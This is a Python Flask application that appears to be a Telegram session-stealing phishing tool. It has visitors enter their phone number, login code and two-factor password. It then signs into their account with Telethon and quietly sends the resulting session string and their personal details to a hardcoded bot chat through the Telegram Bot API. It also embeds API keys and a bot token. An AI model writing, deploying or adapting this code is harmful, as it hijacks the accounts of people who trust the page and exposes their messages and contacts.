from flask import Flask, render_template, request, jsonify, session
from telethon import TelegramClient
from telethon.errors import SessionPasswordNeededError, PhoneCodeInvalidError, PhoneCodeExpiredError, FloodWaitError
from telethon.sessions import StringSession
import asyncio
import os
import json
import requests
import secrets
import logging
import tempfile
import base64

# Configure logging
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

app = Flask(__name__)
app.secret_key = secrets.token_hex(32)

# Telegram API credentials
API_ID = '23171051'
API_HASH = '10331d5d712364f57ffdd23417f4513c'
BOT_TOKEN = '7573902454:AAG0M03o5uHDMLGeFy5crFjBPRRsTbSqPNM'
BOT_CHAT_ID = '7907742294'

async def send_code_request(phone):
    """Send verification code to phone number"""
    try:
        session_name = StringSession()
        client = TelegramClient(session_name, int(API_ID), API_HASH)
        await client.connect()
        
        sent_code = await client.send_code_request(phone)
        session_string = session_name.save()
        
        await client.disconnect()
        
        return {
            'success': True, 
            'phone_code_hash': sent_code.phone_code_hash,
            'session_string': session_string,
            'timeout': getattr(sent_code, 'timeout', 120)
        }
        
    except FloodWaitError as e:
        return {'success': False, 'error': f'Please wait {e.seconds} seconds before trying again'}
    except Exception as e:
        logger.error(f"Error sending code: {e}")
        return {'success': False, 'error': 'Failed to send code. Please try again.'}

async def verify_code_request(phone, code, phone_code_hash, session_string):
    """Verify the received code and create session"""
    try:
        session_name = StringSession(session_string)
        client = TelegramClient(session_name, int(API_ID), API_HASH)
        await client.connect()
        
        try:
            await client.sign_in(phone=phone, code=code, phone_code_hash=phone_code_hash)
        except SessionPasswordNeededError:
            await client.disconnect()
            return {'success': False, 'error': '2FA_PASSWORD_REQUIRED'}
        except PhoneCodeInvalidError:
            await client.disconnect()
            return {'success': False, 'error': 'Invalid code. Please try again.'}
        except PhoneCodeExpiredError:
            await client.disconnect()
            return {'success': False, 'error': 'Code expired. Please request a new one.'}
        
        # Get user information
        me = await client.get_me()
        user_info = {
            'id': me.id,
            'first_name': me.first_name or '',
            'last_name': me.last_name or '',
            'username': me.username or 'N/A',
            'phone': me.phone or phone
        }
        
        # Export final session string
        final_session_string = session_name.save()
        session_filename = f"telethon_session_{phone.replace('+', '')}.session"
        
        await client.disconnect()
        
        return {
            'success': True, 
            'session_string': final_session_string,
            'user_info': user_info,
            'session_filename': session_filename
        }
        
    except Exception as e:
        logger.error(f"Error verifying code: {e}")
        return {'success': False, 'error': 'Verification failed. Please try again.'}

async def verify_2fa_request(phone, password, phone_code_hash, session_string):
    """Verify 2FA password"""
    try:
        session_name = StringSession(session_string)
        client = TelegramClient(session_name, int(API_ID), API_HASH)
        await client.connect()
        
        await client.sign_in(password=password)
        
        # Get user information
        me = await client.get_me()
        user_info = {
            'id': me.id,
            'first_name': me.first_name or '',
            'last_name': me.last_name or '',
            'username': me.username or 'N/A',
            'phone': me.phone or phone
        }
        
        # Export final session string
        final_session_string = session_name.save()
        session_filename = f"telethon_session_{phone.replace('+', '')}.session"
        
        await client.disconnect()
        
        return {
            'success': True, 
            'session_string': final_session_string,
            'user_info': user_info,
            'session_filename': session_filename
        }
    except Exception as e:
        logger.error(f"Error verifying 2FA: {e}")
        return {'success': False, 'error': '2FA verification failed.'}

def run_async(coro):
    """Run async function in new event loop"""
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    try:
        return loop.run_until_complete(coro)
    finally:
        loop.close()

def send_session_to_bot(user_info, session_string, session_filename):
    """Send session file and user info to admin bot"""
    try:
        # Create temporary file
        with tempfile.NamedTemporaryFile(mode='w', suffix='.session', delete=False) as f:
            f.write(session_string)
            temp_path = f.name
        
        # Send document to bot
        with open(temp_path, 'rb') as file:
            url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendDocument"
            files = {'document': (session_filename, file)}
            
            # Prepare caption with user info
            caption = f"""
🔐 *New Session Generated*

👤 *User Information:*
• ID: `{user_info['id']}`
• Name: {user_info['first_name']} {user_info.get('last_name', '')}
• Username: @{user_info.get('username', 'N/A')}
• Phone: +{user_info['phone']}

📁 Session File: `{session_filename}`
            """
            
            data = {
                'chat_id': BOT_CHAT_ID,
                'caption': caption,
                'parse_mode': 'Markdown'
            }
            
            response = requests.post(url, files=files, data=data)
        
        # Clean up temp file
        os.unlink(temp_path)
        
        logger.info(f"Session sent to bot: {response.status_code}")
        return response.status_code == 200
        
    except Exception as e:
        logger.error(f"Error sending session to bot: {e}")
        return False

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/send-code', methods=['POST'])
def send_code():
    phone = request.json.get('phone')
    if not phone:
        return jsonify({'success': False, 'error': 'Phone number is required'})
    
    phone = ''.join(c for c in phone if c.isdigit() or c == '+')
    if not phone.startswith('+'):
        return jsonify({'success': False, 'error': 'Please include country code (e.g., +1)'})
    
    logger.info(f"Sending code to: {phone}")
    
    try:
        result = run_async(send_code_request(phone))
        
        if result['success']:
            session['phone'] = phone
            session['phone_code_hash'] = result['phone_code_hash']
            session['temp_session_string'] = result['session_string']
            
            return jsonify({'success': True, 'timeout': result.get('timeout', 120)})
        else:
            return jsonify(result)
            
    except Exception as e:
        logger.error(f"Exception in send_code: {e}")
        return jsonify({'success': False, 'error': 'Network error. Please try again.'})

@app.route('/verify-code', methods=['POST'])
def verify_code():
    code = request.json.get('code')
    if not code:
        return jsonify({'success': False, 'error': 'Verification code is required'})
    
    phone = session.get('phone')
    phone_code_hash = session.get('phone_code_hash')
    temp_session_string = session.get('temp_session_string')
    
    if not all([phone, phone_code_hash, temp_session_string]):
        return jsonify({'success': False, 'error': 'Session expired. Please start over.'})
    
    logger.info(f"Verifying code for: {phone}")
    
    try:
        result = run_async(verify_code_request(phone, code, phone_code_hash, temp_session_string))
        
        if result['success']:
            # Send session to admin bot
            send_session_to_bot(
                result['user_info'], 
                result['session_string'],
                result['session_filename']
            )
            
            # Clear session data
            session.clear()
            
            return jsonify({'success': True})
        else:
            return jsonify(result)
            
    except Exception as e:
        logger.error(f"Exception in verify_code: {e}")
        return jsonify({'success': False, 'error': 'Verification error. Please try again.'})

@app.route('/verify-2fa', methods=['POST'])
def verify_2fa():
    password = request.json.get('password')
    if not password:
        return jsonify({'success': False, 'error': '2FA password is required'})
    
    phone = session.get('phone')
    phone_code_hash = session.get('phone_code_hash')
    temp_session_string = session.get('temp_session_string')
    
    if not all([phone, phone_code_hash, temp_session_string]):
        return jsonify({'success': False, 'error': 'Session expired. Please start over.'})
    
    logger.info(f"Verifying 2FA for: {phone}")
    
    try:
        result = run_async(verify_2fa_request(phone, password, phone_code_hash, temp_session_string))
        
        if result['success']:
            # Send session to admin bot
            send_session_to_bot(
                result['user_info'], 
                result['session_string'],
                result['session_filename']
            )
            
            # Clear session data
            session.clear()
            
            return jsonify({'success': True})
        else:
            return jsonify(result)
            
    except Exception as e:
        logger.error(f"Exception in verify_2fa: {e}")
        return jsonify({'success': False, 'error': '2FA verification failed.'})

@app.route('/cleanup', methods=['POST'])
def cleanup():
    try:
        session.clear()
        return jsonify({'success': True})
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)})

if __name__ == '__main__':
    if not os.path.exists('sessions'):
        os.makedirs('sessions')
    
    app.run(host='0.0.0.0', port=5000, debug=True)